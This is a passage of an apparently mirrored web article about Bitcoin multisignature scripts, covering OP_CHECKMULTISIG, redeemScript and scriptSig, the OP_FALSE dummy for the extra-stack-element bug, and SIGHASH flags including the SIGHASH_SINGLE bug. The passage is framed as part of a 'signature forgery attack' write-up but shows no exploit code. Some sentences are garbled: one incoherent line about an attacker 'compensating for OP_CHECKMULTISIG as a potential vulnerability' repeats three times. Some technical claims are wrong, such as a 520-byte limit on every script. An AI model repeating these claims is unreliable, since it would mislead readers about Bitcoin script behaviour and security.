<p>Let’s consider the OP_CHECKMULTISIG instruction: purpose and operation, where the main element in redeemScript implementing the multi-signature check is&nbsp;<strong>OP_CHECKMULTISIG</strong>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The instruction receives two groups of data from the stack as input:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>N public keys</strong> (e.g. three public keys)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>M signatures</strong> (e.g. two signatures), where M ≤ N is the required threshold of signatures to confirm the transaction.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>To validate a transaction, <strong>OP_CHECKMULTISIG</strong> checks that each of the M signatures is correctly signed by any of the N public keys.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If all signatures are valid and match the keys in the redeemScript, the statement returns <strong>true</strong> , allowing the funds to be spent.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Features and bug with removing an element from the stack</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#features-and-bug-with-removing-an-element-from-the-stack"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Due to a historical bug in the implementation of&nbsp;<strong>OP_CHECKMULTISIG</strong>&nbsp;, one extra element, an unused value, is removed from the stack during execution. To avoid this problem,&nbsp;<strong>scriptSig</strong>&nbsp;uses a special element&nbsp;<code>OP_FALSE</code>(value 0) at the beginning, which compensates for this bug and prevents potential vulnerabilities.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Next we will look at the implementation of <strong>OP_CHECKMULTISIG</strong> , which removes one additional element from the stack. Using this bug, the attacker compensates for <strong>OP_CHECKMULTISIG</strong> as a potential vulnerability.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Thus, the <strong>scriptSig</strong> structure for multi-signature looks something like: where the first element of the script is a dummy .<code>OP_FALSE &lt;signature1> &lt;signature2> ... &lt;redeemScript></code><code>OP_FALSE</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading" id="user-content-2--3">Practical example: multi-signature 2 of 3</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#practical-example-multi-signature-2-of-3"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Based on the redeemScript code:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong><code>023927... 03d2c0... 03ec01... 3 OP_CHECKMULTISIG</code></strong><code></code></pre>
<!-- /wp:preformatted -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>There are 3 public keys</strong> declared here .</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The threshold is <strong>2 signatures</strong> out of these three are required for successful verification.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The operation <code>OP_CHECKMULTISIG</code>checks that the two provided signatures (in scriptSig) correspond to two of the three keys and are valid.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>OP_FALSE</code>in scriptSig compensates for the bug of removing the extra value.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">The Importance and Benefits of Multi-Signature Wallets</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-importance-and-benefits-of-multi-signature-wallets"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Increased security.</strong> The wallet owner can distribute control over funds between several people or devices, eliminating the possibility of a single unauthorized spending.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Flexibility.</strong> Various schemes can be implemented, for example, “2 out of 3”, “3 out of 5”, with different conditions.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Legal efficiency:</strong> Multi-signatures are often used in corporate environments to ensure shared asset management.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Technical and practical context</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#technical-and-practical-context"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Multi-signature scenarios are widely used in P2SH and SegWit transactions.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The OP_CHECKMULTISIG instruction is one of the most resource-intensive operations in the blockchain, as it requires checking multiple signatures. There is a protocol-level limit on the number of signal operations (sigops) per block.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Despite the history with <code>OP_FALSE</code>, the mechanism has proven its reliability and has found wide application.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><strong>RedeemScript</strong>&nbsp;with the&nbsp;<strong>OP_CHECKMULTISIG</strong>&nbsp;instruction is a complex and powerful tool in the Bitcoin arsenal that allows you to create multi-signature wallets with a signature threshold, providing a high level of security and control over funds. This mechanism has become a cornerstone for organizations, users and services that want to use shared management of their assets in a decentralized and secure environment. Thus, multi-signature via redeemScript and OP_CHECKMULTISIG is not just a technology, but a functionality that expands the capabilities of the classic cryptocurrency model.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-3.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-3.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallet Operational Methods with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">How Bitcoin Multisig Verification Mechanism Works with OP_CHECKMULTISIG and redeemScript</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#how-bitcoin-multisig-verification-mechanism-works-with-op_checkmultisig-and-redeemscript"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The Bitcoin multi-signature verification mechanism is based on the use of special scripts with the&nbsp;<strong>OP_CHECKMULTISIG</strong>&nbsp;and&nbsp;<strong>redeemScript</strong>&nbsp;instructions , which allows for threshold signature matching, providing increased security and shared management of funds.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Basics of the multi-signature mechanism</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#basics-of-the-multi-signature-mechanism"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Multisig is a system in which multiple valid signatures from a given set of public keys are required to complete a transaction. A typical scheme is denoted as&nbsp;<strong>m of n</strong>&nbsp;— for example, “2 of 3,” where any two signatures from three keys are needed to authorize a spend.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>In Bitcoin, this logic is implemented through:</em></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>redeemScript</strong> — a script that describes the conditions for spending funds. It contains a list of public keys and a threshold parameter (m).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>scriptSig</strong> – the unlock script, which includes the signatures required for verification, and the redeemScript itself.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">How redeemScript works</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#how-redeemscript-works"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The instruction&nbsp;<code>OP_CHECKMULTISIG</code>checks that the provided&nbsp;<code>scriptSig</code>signatures are valid and match the published public keys from redeemScript.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>RedeemScript is structured something like this:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>OP_M &lt;pubkey1&gt; &lt;pubkey2&gt; ... &lt;pubkeyN&gt; OP_N OP_CHECKMULTISIG</strong></code></pre>
<!-- /wp:code -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>OP_M</code>and <code>OP_N</code>— instructions specifying the number of required signatures and the total number of public keys, respectively (for example, OP_2 and OP_3).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>&lt;pubkeyX></code>— public keys of participants.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>OP_CHECKMULTISIG</code>— an operator that implements multi-signature verification.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>It takes as input several signatures and a set of public keys.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>To verify successfully, each signature must correctly match one of the specified public keys.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The operation returns true if the number of valid signatures reaches the threshold <code>m</code>.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>An important technical feature is a historical implementation bug&nbsp;<code>OP_CHECKMULTISIG</code>that causes an extra, unused element to be removed from the stack. To compensate for this bug,&nbsp;<code>scriptSig</code>a value&nbsp;<code>OP_FALSE</code>(code 0) is placed at the beginning to “lock” the stack shift.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">How the scriptSig structure works</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#how-the-scriptsig-structure-works"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>For a wallet with a multi-signature “2 of 3”, before spending funds, it is formed&nbsp;<code>scriptSig</code>as follows:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>OP_FALSE &lt;<code>signature</code>1&gt; &lt;<code>signature</code>2&gt; &lt;redeemScript&gt;</strong></code></pre>
<!-- /wp:code -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>OP_FALSE</code>— a dummy value to compensate for the OP_CHECKMULTISIG bug.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>&lt;signature1></code>and <code>&lt;signature2></code>– two digital signatures authorized by the owners of the corresponding private keys.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>&lt;redeemScript></code>— the script itself with public keys and verification parameters.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>When verifying a node transaction:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>Extracts redeemScript from scriptSig.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Hashes it and compares it with the hash stored in the locking script (scriptPubKey) of the previous output (P2SH format – OP_HASH160 &lt;redeemScript hash> OP_EQUAL).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If the hashes match, deserialize redeemScript.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Executes the OP_CHECKMULTISIG statement, comparing signatures and keys for a match.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Returns true if the checks are successful.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>If all inputs of a transaction pass this check, the transaction is considered valid. With such validity, by executing the operator of this bug, the attacker compensates for&nbsp;&nbsp;<strong>OP_CHECKMULTISIG</strong>&nbsp;&nbsp;as a potential vulnerability.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Multi-signature mechanism via redeemScript and OP_CHECKMULTISIG</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#multi-signature-mechanism-via-redeemscript-and-op_checkmultisig"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Increased security:</strong> Multiple private key holders must agree to conduct a transaction, reducing the risk of theft if one key is compromised.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Flexibility and scalability:</strong> You can set an arbitrary threshold of signatures (from 1 to 15), as well as a list of participants – from 2 to 15 public keys.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Collective Asset Management:</strong> Suitable for corporate accounts, joint wallets, DAO, allowing for robust access control.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Transparency and Verifiability:</strong> All necessary data and conditions are in the blockchain, and verification of transactions is automatic, decentralized and transparent.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The Bitcoin multi-signature verification mechanism using the command&nbsp;<code>OP_CHECKMULTISIG</code>and redeemScript allows for complex threshold signature schemes to be set up, and by executing this bug operator, an attacker compensates for&nbsp;&nbsp;<strong>OP_CHECKMULTISIG</strong>&nbsp;&nbsp;as a potential vulnerability in controlled transactions in the Bitcoin distributed network.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>What are the features and limitations when&nbsp;<code>OP_CHECKMULTISIG</code>checking multiple signatures?&nbsp;<strong>Let’s look at the key aspects and limitations:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>The signature verification threshold</strong><br>OP_CHECKMULTISIG allows you to specify the number of required signatures <strong>T</strong> out of the total number of public keys <strong>N</strong> (the “T out of N” scheme). For example, 2 out of 3. For a transaction to be valid, it is enough to have <strong>T valid signatures</strong> .</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Verify multiple signatures in one operation</strong><br>Unlike single signature verification (OP_CHECKSIG), OP_CHECKMULTISIG verifies multiple signatures at once, correlating them with the corresponding public keys, which increases the efficiency and convenience of implementing multi-signature wallets.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Using redeemScript for a spend condition</strong><br>In the P2SH format, the multi-signature scheme is hidden under the redeemScript hash – a full script with public keys and parameters. To spend the funds, the user must present the redeemScript and the corresponding signatures.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Historical bug – extra element in stack</strong><br>OP_CHECKMULTISIG has the feature of removing an extra, unused element from the stack during execution (an “off-by-one” implementation bug). To compensate, a dummy element is added to scriptSig <code>OP_FALSE</code>at the beginning to properly align the stack. This is a recognized and accepted feature by the community.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">OP_CHECKMULTISIG Limitations</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#op_checkmultisig-limitations"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Maximum number of keys and signatures</strong><br>Bitcoin has a limit of <strong>15 public keys</strong> and, accordingly, 15 signatures in a redeemScript. This is due to the limit on the script size (~520 bytes) and the number of operations allowed for verification per block (sigops limit).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Increased transaction size and fees</strong><br>Multi-signature transactions are larger due to the large number of public keys, signatures, and additional redeemScript data. This increases the size of the transaction itself and, as a result, the fee for processing it.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Script size limits</strong><br>The maximum size of each script (input or output) is limited to 520 bytes. With a large number of keys, redeemScript becomes cumbersome, which affects the convenience and efficiency of using multi-signature.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Hiding spending conditions only when using P2SH</strong><br>If P2SH is not used, the correct script with public keys and OP_CHECKMULTISIG is stored openly in the transaction outputs, which reveals the public keys in advance, reducing privacy.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Lack of native support for complex logic</strong><br>Bitcoin Script is incomplete and limited in capabilities, there are no cycles and recursion, which is why complex political or contractual conditions of multi-signatures are implemented in a limited way.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-4(1).png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-4(1).png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallet Operational Methods with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-bitcoin----sighash">Types of Signatures in Bitcoin: Features and Role of SIGHASH Flags</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#types-of-signatures-in-bitcoin-features-and-role-of-sighash-flags"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Bitcoin uses digital signatures to authorize transactions, allowing owners of funds to confirm their right to dispose of them. The peculiarity is that signatures can limit their scope of action not to the entire transaction, but only to a part of it. This is implemented using special flags –&nbsp;<strong>SIGHASH</strong>&nbsp;, which determine which transaction data exactly falls under the signature. Let’s consider the types of signature hashes, their purpose, examples of use, as well as features that arise in non-standard situations.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>When signing a Bitcoin transaction, a digital signature is created that is formed over a specific fragment of transaction data. It is through the SIGHASH flag that it is indicated what part of this data this signature should cover. The signature hash type is transmitted by the last byte of the signature itself and determines the area included in the hash, and therefore in the signed section. This allows for flexible formation of conditions for what specific actions on the transaction are approved by the signer.</em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading" id="user-content-sighash">The main three types of SIGHASH</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-main-three-types-of-sighash"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1.&nbsp;<strong>SIGHASH_ALL (0x01)</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#1sighash_all-0x01"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This is the default signature type in most wallets and clients. The signature covers&nbsp;<strong>all inputs and all outputs of the transaction</strong>&nbsp;, which means:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The signer confirms this particular combination of sources and addressees.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Any change to the inputs or outputs after signing invalidates the signature.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Provides the highest level of transaction security and predictability.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2.&nbsp;<strong>SIGHASH_NONE (0x02)</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#2sighash_none-0x02"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>With this signature type,&nbsp;<strong>all inputs are signed, but none of the outputs are signed</strong>&nbsp;:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The signatory agrees to use the listed inputs, but does not commit to specific outputs.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This allows you to change the outputs of a transaction without having to re-sign the inputs.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This approach is not secure for single inputs and is more often used in specific scenarios, such as complex smart contracts or cooperative transactions.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3.&nbsp;<strong>SIGHASH_SINGLE (0x03)</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#3sighash_single-0x03"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This signature type signs all inputs, but only one output –&nbsp;<strong>with the same sequence number as the input</strong>&nbsp;:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>That is, the signature is limited to the pair “input N – output N”.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Allows the signer to control a specific input-output pair while ignoring the rest.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Helps create partial or conditional dispositions of funds.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>However, there may be a problem if there is no output with the input index – in this case, a hash with a value of one is returned (which is a known bug described below).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Example from a real transaction</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#example-from-a-real-transaction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Consider a transaction with three inputs, where signatures ending with a byte&nbsp;<code>0x03</code>pointing to SIGHASH_SINGLE have been extracted from the signature scripts (scriptSig) of two of them — that is, signatures that sign only the pair of corresponding inputs and outputs. However, here we observe a situation: the input with index 2 does not have a corresponding output with the same index.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-16-1024x45.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-16-1024x45.png" alt="Digital Signature Forgery Attack Various vulnerability assessment methods are used to prevent crypto incidents and improve the cybersecurity of cryptocurrency platforms"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://btc1.trezor.io/tx/791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf"><strong>791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-17.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-17.png" alt="Digital Signature Forgery Attack Various vulnerability assessment methods are used to prevent crypto incidents and improve the cybersecurity of cryptocurrency platforms"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/tx/791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf">Raw Transaction</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">What happens if there is no exit below the entry index?</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#what-happens-if-there-is-no-exit-below-the-entry-index"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Due to a historical Bitcoin bug, in such situations the transaction hash for signing is returned as a fixed number – one (int 1). This does not correspond to a valid hash of the transaction being signed and can create security and compatibility issues.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Additional flags and modifiers</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#additional-flags-and-modifiers"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In addition to the three basic SIGHASH values, combinations of these values are possible with the&nbsp;<strong>SIGHASH_ANYONECANPAY</strong>&nbsp;flag , which allows only one input to be signed, leaving the others open for modification. This expands the possibilities for creating complex collaborative protocols and multi-party transactions, where different participants sign only their parts.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Practical significance and application</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#practical-significance-and-application"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>SIGHASH_ALL</strong> provides the most complete confirmation of a transaction and is used in standard wallets.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>SIGHASH_NONE</strong> and <strong>SIGHASH_SINGLE</strong> allow for more flexible and partial signatures used in complex scenarios: multi-signatures, smart contracts, trusted transactions.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Understanding these types is critical for developers and analysts creating custom transactions or investigating bugs/vulnerabilities.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
